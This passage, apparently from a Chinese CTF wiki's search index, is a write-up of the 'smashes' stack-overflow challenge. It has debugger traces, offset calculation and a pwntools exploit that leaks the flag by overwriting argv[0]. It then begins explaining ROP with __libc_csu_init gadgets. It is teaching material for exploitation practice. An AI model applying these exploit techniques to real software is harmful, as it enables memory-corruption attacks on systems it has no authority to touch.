            "text": "\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3a64\u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86Canary\u4fdd\u62a4\u4ee5\u53caNX\u4fdd\u62a4\uff0c\u4ee5\u53caFORTIFY\u4fdd\u62a4\u3002  \u279c  stacksmashes git: ( master )  \u2717 checksec smashes\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 ) \n    FORTIFY:  Enabled", 
            "title": "\u786e\u5b9a\u4fdd\u62a4"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_11", 
            "text": "ida\u770b\u4e00\u4e0b  __int64   sub_4007E0 ()  { \n   __int64   v0 ;   // rax@1 \n   __int64   v1 ;   // rbx@2 \n   int   v2 ;   // eax@3 \n   __int64   v4 ;   // [sp+0h] [bp-128h]@1 \n   __int64   v5 ;   // [sp+108h] [bp-20h]@1 \n\n   v5   =   * MK_FP ( __FS__ ,   40LL ); \n   __printf_chk ( 1LL ,   ( __int64 ) Hello! \\n What s your name?  ); \n   LODWORD ( v0 )   =   _IO_gets (( __int64 ) v4 ); \n   if   (   ! v0   )  LABEL_9 : \n     _exit ( 1 ); \n   v1   =   0LL ; \n   __printf_chk ( 1LL ,   ( __int64 ) Nice to meet you, %s. \\n Please overwrite the flag:  ); \n   while   (   1   ) \n   { \n     v2   =   _IO_getc ( stdin ); \n     if   (   v2   ==   - 1   ) \n       goto   LABEL_9 ; \n     if   (   v2   ==   \\n   ) \n       break ; \n     byte_600D20 [ v1 ++ ]   =   v2 ; \n     if   (   v1   ==       ) \n       goto   LABEL_8 ; \n   } \n   memset (( void   * )(( signed   int ) v1   +   0x600D20LL ),   0 ,   ( unsigned   int )( 32   -   v1 ));  LABEL_8 : \n   puts ( Thank you, bye! ); \n   return   * MK_FP ( __FS__ ,   40LL )   ^   v5 ;  }   \u5f88\u663e\u7136\uff0c\u7a0b\u5e8f\u5728_IO_gets((__int64) v4);\u5b58\u5728\u6808\u6ea2\u51fa\u3002  \u6b64\u5916\uff0c\u7a0b\u5e8f\u4e2d\u8fd8\u63d0\u793a\u8981overwrite flag\u3002\u800c\u4e14\u53d1\u73b0\u7a0b\u5e8f\u5f88\u6709\u610f\u601d\u7684\u5728while\u5faa\u73af\u4e4b\u540e\u6267\u884c\u4e86\u8fd9\u6761\u8bed\u53e5     memset (( void   * )(( signed   int ) v1   +   0x600D20LL ),   0 ,   ( unsigned   int )( 32   -   v1 ));   \u53c8\u770b\u4e86\u770b\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u5185\u5bb9\uff0c\u8bf4\u660e\u7a0b\u5e8f\u7684flag\u5c31\u5728\u8fd9\u91cc\u554a\u3002  .data:0000000000600D20 ; char aPctfHereSTheFl[]\n.data:0000000000600D20 aPctfHereSTheFl db  PCTF{Here ,27h, s the flag on server} ,0  \u4f46\u662f\u5982\u679c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u6808\u6ea2\u51fa\u8f93\u51fa\u8be5\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u53ef\u884c\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bfb\u5165\u7684\u5185\u5bb9 byte_600D20[v1++] = v2; \u4e5f\u6070\u6070\u5c31\u662f\u8be5\u5757\u5185\u5b58\uff0c\u8fd9\u4f1a\u76f4\u63a5\u5c06\u5176\u8986\u76d6\u6389\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u5229\u7528\u4e00\u4e2a\u6280\u5de7\u4e86   \u5728EFL\u5185\u5b58\u6620\u5c04\u65f6\uff0cbss\u6bb5\u4f1a\u88ab\u6620\u5c04\u4e24\u6b21\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53e6\u4e00\u5904\u7684\u5730\u5740\u6765\u8fdb\u884c\u8f93\u51fa\uff0c\u53ef\u4ee5\u4f7f\u7528gdb\u7684find\u6765\u8fdb\u884c\u67e5\u627e\u3002", 
            "title": "\u5206\u6790\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#flag", 
            "text": "\u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u8f7dmemset\u51fd\u6570\u5904\uff0c\u7136\u540e\u8bfb\u53d6\u76f8\u5e94\u7684\u5185\u5bb9\u5982\u4e0b  gef \u27a4    c  Continuing.  Hello !  What s   your   name ?   qqqqqqq  Nice   to   meet   you ,   qqqqqqq.  Please   overwrite   the   flag :   222222222  Breakpoint   1 ,   __memset_avx2   ()   at   .. / sysdeps / x86_64 / multiarch / memset-avx2.S : 38  38    .. / sysdeps / x86_64 / multiarch / memset-avx2.S :   \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55 .  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code:i386: x86-64   ] \u2500\u2500\u2500\u2500 \n    0 x7ffff7b7f920   __memset_chk_avx2 + 0   cmp      rcx ,   rdx \n    0 x7ffff7b7f923   __memset_chk_avx2 + 3   jb       0x7ffff7b24110   __GI___chk_fail \n    0 x7ffff7b7f929                    nop      DWORD   PTR   [ rax + 0x0 ] \n  \u2192   0 x7ffff7b7f930   __memset_avx2 + 0   vpxor    xmm0 ,   xmm0 ,   xmm0 \n    0 x7ffff7b7f934   __memset_avx2 + 4   vmovd    xmm1 ,   esi \n    0 x7ffff7b7f938   __memset_avx2 + 8   lea      rsi ,   [ rdi + rdx * 1 ] \n    0 x7ffff7b7f93c   __memset_avx2 + 12   mov      rax ,   rdi  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 x7fffffffda38 ,   l8 ]  8  0 x00007fffffffda38 \u2502+ 0x00 :   0x0000000000400878    \u2192     mov   edi ,   0x40094e    \u2190   $rsp  0 x00007fffffffda40 \u2502+ 0x08 :   0x0071717171717171   ( qqqqqqq ? )  0 x00007fffffffda48 \u2502+ 0x10 :   0x0000000000000000  0 x00007fffffffda50 \u2502+ 0x18 :   0x0000000000000000  0 x00007fffffffda58 \u2502+ 0x20 :   0x0000000000000000  0 x00007fffffffda60 \u2502+ 0x28 :   0x0000000000000000  0 x00007fffffffda68 \u2502+ 0x30 :   0x0000000000000000  0 x00007fffffffda70 \u2502+ 0x38 :   0x0000000000000000  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   trace   ] \u2500\u2500\u2500\u2500  [ #0] 0x7ffff7b7f930 \u2192 Name: __memset_avx2()  [ #1] 0x400878 \u2192 mov edi, 0x40094e  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  gef \u27a4    find   22222  Argument   required   ( expression   to   compute ).  gef \u27a4    find   22222  No   symbol   22222   in   current   context.  gef \u27a4    grep   22222  [+]   Searching   22222   in   memory  [+]   In   / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / stacksmashes / smashes ( 0x600000 - 0x601000 ),   permission = rw- \n   0 x600d20   -   0x600d3f    \u2192     222222222 s   the   flag   on   server }   [ + ]   In   [ heap ] ( 0x601000 - 0x622000 ),   permission = rw- \n   0 x601010   -   0x601019    \u2192     222222222   gef \u27a4    grep   PCTF  [+]   Searching   PCTF   in   memory  [+]   In   / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / stacksmashes / smashes ( 0x400000 - 0x401000 ),   permission = r-x \n   0 x400d20   -   0x400d3f    \u2192     PCTF { Here s   the   flag   on   server }    \u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u8bfb\u5165\u76842222\u5df2\u7ecf\u8986\u76d6\u4e860x600d20\u5904\u7684flag\uff0c\u4f46\u662f\u6211\u4eec\u5728\u5185\u5b58\u76840x400d20\u5904\u4ecd\u7136\u627e\u5230\u4e86\u8fd9\u4e2aflag\u7684\u5907\u4efd\uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u5c06\u5176\u8f93\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u786e\u5b9a\u4e86flag\u7684\u5730\u5740\u3002", 
            "title": "\u786e\u5b9aflag\u5730\u5740"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_12", 
            "text": "\u4e0b\u9762\uff0c\u6211\u4eec\u786e\u5b9aargv[0]\u8ddd\u79bb\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u3002  \u9996\u5148\u4e0b\u65ad\u70b9\u5728main\u51fd\u6570\u5165\u53e3\u5904\uff0c\u5982\u4e0b  gef \u27a4    b   * 0x00000000004006D0  Breakpoint   1   at   0x4006d0  gef \u27a4    r  Starting   program :   / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / stacksmashes / smashes   Breakpoint   1 ,   0x00000000004006d0   in   ??   () \n  code:i386: x86-64   ] \u2500\u2500\u2500\u2500 \n      0 x4006c0   _IO_gets@plt + 0   jmp      QWORD   PTR   [ rip + 0x20062a ]          # 0x600cf0  _IO_gets@got.plt \n      0x4006c6   _IO_gets@plt + 6   push     0x9 \n      0 x4006cb   _IO_gets@plt + 11   jmp      0x400620 \n  \u2192     0 x4006d0                    sub      rsp ,   0x8 \n      0 x4006d4                    mov      rdi ,   QWORD   PTR   [ rip + 0x200665 ]          # 0x600d40  stdout \n      0x4006db                    xor      esi ,   esi \n      0 x4006dd                    call     0x400660   setbuf@plt  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 x7fffffffdb78 ,   l8 ]  8  0 x00007fffffffdb78 \u2502+ 0x00 :   0x00007ffff7a2d830    \u2192    __libc_start_main + 240   mov   edi ,   eax      \u2190   $rsp  0 x00007fffffffdb80 \u2502+ 0x08 :   0x0000000000000000  0 x00007fffffffdb88 \u2502+ 0x10 :   0x00007fffffffdc58    \u2192    0x00007fffffffe00b    \u2192    / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / exam [...]  0 x00007fffffffdb90 \u2502+ 0x18 :   0x0000000100000000  0 x00007fffffffdb98 \u2502+ 0x20 :   0x00000000004006d0    \u2192     sub   rsp ,   0x8  0 x00007fffffffdba0 \u2502+ 0x28 :   0x0000000000000000  0 x00007fffffffdba8 \u2502+ 0x30 :   0x48c916d3cf726fe3  0 x00007fffffffdbb0 \u2502+ 0x38 :   0x00000000004006ee    \u2192     xor   ebp ,   ebp  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   trace   ] \u2500\u2500\u2500\u2500  [ #0] 0x4006d0 \u2192 sub rsp, 0x8  [ #1] 0x7ffff7a2d830 \u2192 Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init= optimized out , fini= optimized out , rtld_fini= optimized out , stack_end=0x7fffffffdc48)  --- Type   return   to   continue ,   or   q   return   to   quit---  [ #2] 0x400717 \u2192 hlt    \u53ef\u4ee5\u770b\u51fa0x00007fffffffe00b\u6307\u5411\u7a0b\u5e8f\u540d\uff0c\u5176\u81ea\u7136\u5c31\u662fargv[0]\uff0c\u6240\u4ee5\u6211\u4eec\u4fee\u6539\u7684\u5185\u5bb9\u5c31\u662f\u8fd9\u4e2a\u5730\u5740\u3002\u540c\u65f60x00007fffffffdc58\u5904\u4fdd\u7559\u7740\u8be5\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u771f\u6b63\u9700\u8981\u7684\u5730\u5740\u662f0x00007fffffffdc58\u3002  \u6b64\u5916\uff0c\u6839\u636e\u6c47\u7f16\u4ee3\u7801  .text: 00000000004007 E0                   push      rbp  .text: 00000000004007 E1                   mov       esi ,   offset   aHelloWhatSYour   ;  Hello!\\nWhat s your name?   .text : 00000000004007 E6                   mov       edi ,   1  .text: 00000000004007 EB                   push      rbx  .text: 00000000004007 EC                   sub       rsp ,   118 h  .text: 00000000004007 F3                   mov       rax ,   fs : 28 h  .text: 00000000004007 FC                   mov       [ rsp + 128 h + var_20 ],   rax  .text: 0000000000400804                   xor       eax ,   eax  .text: 0000000000400806                   call      ___printf_chk  .text: 000000000040080 B                   mov       rdi ,   rsp  .text: 000000000040080 E                   call      __IO_gets   \u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u8bfb\u5165\u7684\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u5176\u5b9e\u5c31\u662f\u8c03\u7528__IO_gets\u4e4b\u524d\u7684rsp\uff0c\u6240\u4ee5\u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u5728call\u5904\uff0c\u5982\u4e0b  gef \u27a4    b   * 0x000000000040080E  Breakpoint   2   at   0x40080e  gef \u27a4    c  Continuing.  Hello !  What s   your   name ?   Breakpoint   2 ,   0x000000000040080e   in   ??   ()  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code:i386: x86-64   ] \u2500\u2500\u2500\u2500 \n      0 x400804                    xor      eax ,   eax \n      0 x400806                    call     0x4006b0   __printf_chk@plt \n      0 x40080b                    mov      rdi ,   rsp \n  \u2192     0 x40080e                    call     0x4006c0   _IO_gets@plt \n    \u21b3      0 x4006c0   _IO_gets@plt + 0   jmp      QWORD   PTR   [ rip + 0x20062a ]          # 0x600cf0  _IO_gets@got.plt \n         0x4006c6   _IO_gets@plt + 6   push     0x9 \n         0 x4006cb   _IO_gets@plt + 11   jmp      0x400620 \n         0 x4006d0                    sub      rsp ,   0x8  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 x7fffffffda40 ,   l8 ]  8  0 x00007fffffffda40 \u2502+ 0x00 :   0x0000ff0000000000       \u2190   $rsp ,   $rdi  0 x00007fffffffda48 \u2502+ 0x08 :   0x0000000000000000  0 x00007fffffffda50 \u2502+ 0x10 :   0x0000000000000000  0 x00007fffffffda58 \u2502+ 0x18 :   0x0000000000000000  0 x00007fffffffda60 \u2502+ 0x20 :   0x0000000000000000  0 x00007fffffffda68 \u2502+ 0x28 :   0x0000000000000000  0 x00007fffffffda70 \u2502+ 0x30 :   0x0000000000000000  0 x00007fffffffda78 \u2502+ 0x38 :   0x0000000000000000  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   trace   ] \u2500\u2500\u2500\u2500  [ #0] 0x40080e \u2192 call 0x4006c0  _IO_gets@plt  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  gef \u27a4    print   $rsp  $1   =   ( void   *)   0x7fffffffda40   \u53ef\u4ee5\u770b\u51farsp\u7684\u503c\u4e3a0x7fffffffda40\uff0c\u90a3\u4e48\u76f8\u5bf9\u504f\u79fb\u4e3a    0x00007fffffffdc58 - 0x7fffffffda40  536    hex ( 536 )  0x218", 
            "title": "\u786e\u5b9a\u504f\u79fb"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_13", 
            "text": "\u6211\u4eec\u6784\u9020\u5229\u7528\u7a0b\u5e8f\u5982\u4e0b  from   pwn   import   *  context . log_level   =   debug  smash   =   ELF ( ./smashes )  if   args [ REMOTE ]: \n     sh   =   remote ( pwn.jarvisoj.com ,   9877 )  else : \n     sh   =   process ( ./smashes )  argv_addr   =   0x00007fffffffdc58  name_addr   =   0x7fffffffda40  flag_addr   =   0x600D20  another_flag_addr   =   0x400d20  payload   =   a   *   ( argv_addr   -   name_addr )   +   p64 ( another_flag_addr )  sh . recvuntil ( name?  )  sh . sendline ( payload )  sh . recvuntil ( flag:  )  sh . sendline ( bb )  data   =   sh . recv ()  sh . interactive ()   \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c31\u5f97\u5230\u4e86flag\uff0c\u6ca1\u6709\u51fa\u73b0\u7f51\u4e0a\u8bf4\u7684\u5f97\u4e0d\u5230flag\u7684\u60c5\u51b5\u3002", 
            "title": "\u5229\u7528\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_14", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/", 
            "text": "\u4e2d\u7ea7ROP\n\n\n\u4e2d\u7ea7ROP\u4e3b\u8981\u662f\u4f7f\u7528\u4e86\u4e00\u4e9b\u6bd4\u8f83\u5de7\u5999\u7684Gadgets\u3002\n\n\nret2__libc_scu_init\n\n\n\u539f\u7406\n\n\n\u572864\u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u51fd\u6570\u7684\u524d6\u4e2a\u53c2\u6570\u662f\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u7684\uff0c\u4f46\u662f\u5927\u591a\u6570\u65f6\u5019\uff0c\u6211\u4eec\u5f88\u96be\u627e\u5230\u6bcf\u4e00\u4e2a\u5bc4\u5b58\u5668\u5bf9\u5e94\u7684gadgets\u3002 \u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528x64\u4e0b\u7684__libc_scu_init\u4e2d\u7684gadgets\u3002\u8fd9\u4e2a\u51fd\u6570\u662f\u7528\u6765\u5bf9libc\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\u7684\uff0c\u800c\u4e00\u822c\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528libc\u51fd\u6570\uff0c\u6240\u4ee5\u8fd9\u4e2a\u51fd\u6570\u4e00\u5b9a\u4f1a\u5b58\u5728\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570(\u5f53\u7136\uff0c\u4e0d\u540c\u7248\u672c\u7684\u8fd9\u4e2a\u51fd\u6570\u6709\u4e00\u5b9a\u7684\u533a\u522b)\n\n\n.text:\n00000000004005\nC0\n \n; void _libc_csu_init(void)\n\n\n.text\n:\n00000000004005\nC0\n                 \npublic\n \n__libc_csu_init\n\n\n.text:\n00000000004005\nC0\n \n__libc_csu_init\n \nproc\n \nnear\n               \n; DATA XREF: _start+16\u0018o\n\n\n.text\n:\n00000000004005\nC0\n                 \npush\n    \nr15\n\n\n.text:\n00000000004005\nC2\n                 \npush\n    \nr14\n\n\n.text:\n00000000004005\nC4\n                 \nmov\n     \nr15d\n,\n \nedi\n\n\n.text:\n00000000004005\nC7\n                 \npush\n    \nr13\n\n\n.text:\n00000000004005\nC9\n                 \npush\n    \nr12\n\n\n.text:\n00000000004005\nCB\n                 \nlea\n     \nr12\n,\n \n__frame_dummy_init_array_entry\n\n\n.text:\n00000000004005\nD2\n                 \npush\n    \nrbp\n\n\n.text:\n00000000004005\nD3\n                 \nlea\n     \nrbp\n,\n \n__do_global_dtors_aux_fini_array_entry\n\n\n.text:\n00000000004005\nDA\n                 \npush\n    \nrbx\n\n\n.text:\n00000000004005\nDB\n                 \nmov\n     \nr14\n,\n \nrsi\n\n\n.text:\n00000000004005\nDE\n                 \nmov\n     \nr13\n,\n \nrdx\n\n\n.text:\n00000000004005\nE1\n                 \nsub\n     \nrbp\n,\n \nr12\n\n\n.text:\n00000000004005\nE4\n                 \nsub\n     \nrsp\n,\n \n8\n\n\n.text:\n00000000004005\nE8\n                 \nsar\n     \nrbp\n,\n \n3\n\n\n.text:\n00000000004005\nEC\n                 \ncall\n    \n_init_proc\n\n\n.text:\n00000000004005\nF1\n                 \ntest\n    \nrbp\n,\n \nrbp\n\n\n.text:\n00000000004005\nF4\n                 \njz\n      \nshort\n \nloc_400616\n\n\n.text:\n00000000004005\nF6\n                 \nxor\n     \nebx\n,\n \nebx\n\n\n.text:\n00000000004005\nF8\n                 \nnop\n     \ndword\n \nptr\n \n[\nrax\n+\nrax\n+\n00000000\nh\n]\n\n\n.text:\n0000000000400600\n\n\n.text:\n0000000000400600\n \nloc_400600:\n                             \n; CODE XREF: __libc_csu_init+54\u0019j\n\n\n.text:\n0000000000400600\n                 \nmov\n     \nrdx\n,\n \nr13\n\n\n.text:\n0000000000400603\n                 \nmov\n     \nrsi\n,\n \nr14\n\n\n.text:\n0000000000400606\n                 \nmov\n     \nedi\n,\n \nr15d\n\n\n.text:\n0000000000400609\n                 \ncall\n    \nqword\n \nptr\n \n[\nr12\n+\nrbx\n*\n8\n]\n\n\n.text:\n000000000040060\nD\n                 \nadd\n     \nrbx\n,\n \n1\n\n\n.text:\n0000000000400611\n                 \ncmp\n     \nrbx\n,\n \nrbp\n\n\n.text:\n0000000000400614\n                 \njnz\n     \nshort\n \nloc_400600\n\n\n.text:\n0000000000400616\n\n\n.text:\n0000000000400616\n \nloc_400616:\n                             \n; CODE XREF: __libc_csu_init+34\u0018j\n\n\n.text:\n0000000000400616\n                 \nadd\n     \nrsp\n,\n \n8\n\n\n.text:\n000000000040061\nA\n                 \npop\n     \nrbx\n\n\n.text:\n000000000040061\nB\n                 \npop\n     \nrbp\n\n\n.text:\n000000000040061\nC\n                 \npop\n     \nr12\n\n\n.text:\n000000000040061\nE\n                 \npop\n     \nr13\n\n\n.text:\n0000000000400620\n                 \npop\n     \nr14\n\n\n.text:\n0000000000400622\n                 \npop\n     \nr15\n\n\n.text:\n0000000000400624\n                 \nretn\n\n\n.text:\n0000000000400624\n \n__libc_csu_init\n \nendp\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4ee5\u4e0b\u51e0\u70b9\n\n\n\n\n\u4ece0x000000000040061A\u4e00\u76f4\u5230\u7ed3\u5c3e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u6784\u9020\u6808\u4e0a\u6570\u636e\u6765\u63a7\u5236rbx,rbp,r12,r13,r14,r15\u5bc4\u5b58\u5668\u7684\u6570\u636e\u3002\n\n\n\u4ece0x0000000000400600\u52300x0000000000400609\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06r13\u8d4b\u7ed9rdx,\u5c06r14\u8d4b\u7ed9rsi\uff0c\u5c06r15d\u8d4b\u7ed9edi\uff08\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u867d\u7136\u8fd9\u91cc\u8d4b\u7ed9\u7684\u662fedi\uff0c\n\u4f46\u5176\u5b9e\u6b64\u65f6rdi\u7684\u9ad832\u4f4d\u5bc4\u5b58\u5668\u503c\u4e3a0\uff08\u81ea\u884c\u8c03\u8bd5\uff09\n\uff0c\u6240\u4ee5\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236rdi\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u53ea\u4e0d\u8fc7\u53ea\u80fd\u63a7\u5236\u4f4e32\u4f4d\uff09\uff0c\u800c\u8fd9\u4e09\u4e2a\u5bc4\u5b58\u5668\uff0c\u4e5f\u662fx64\u51fd\u6570\u8c03\u7528\u4e2d\u4f20\u9012\u7684\u524d\u4e09\u4e2a\u5bc4\u5b58\u5668\u3002\u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5408\u7406\u5730\u63a7\u5236r12\u4e0erbx\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8c03\u7528\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u51fd\u6570\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u63a7\u5236rbx\u4e3a0\uff0cr12\u4e3a\u5b58\u50a8\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740\u3002\n\n\n\u4ece0x000000000040060D\u52300x0000000000400614\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236rbx\u4e0erbp\u7684\u4e4b\u95f4\u7684\u5173\u7cfb\u4e3arbx+1=rbp\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u4e0d\u4f1a\u6267\u884cloc_400600\uff0c\u8fdb\u800c\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\u4e0b\u9762\u7684\u6c47\u7f16\u7a0b\u5e8f\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7684\u8bbe\u7f6erbx=0\uff0crbp=1\u3002\n\n\n\n\n\u793a\u4f8b\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5\u84b8\u7c73\u7684\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u4e4blinux_x64\u7bc7\u4e2dlevel5\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\u68c0\u67e5\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4\n\n\n\u279c  ret2__libc_csu_init git:\n(\niromise\n)\n \u2717 checksec level5   \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE 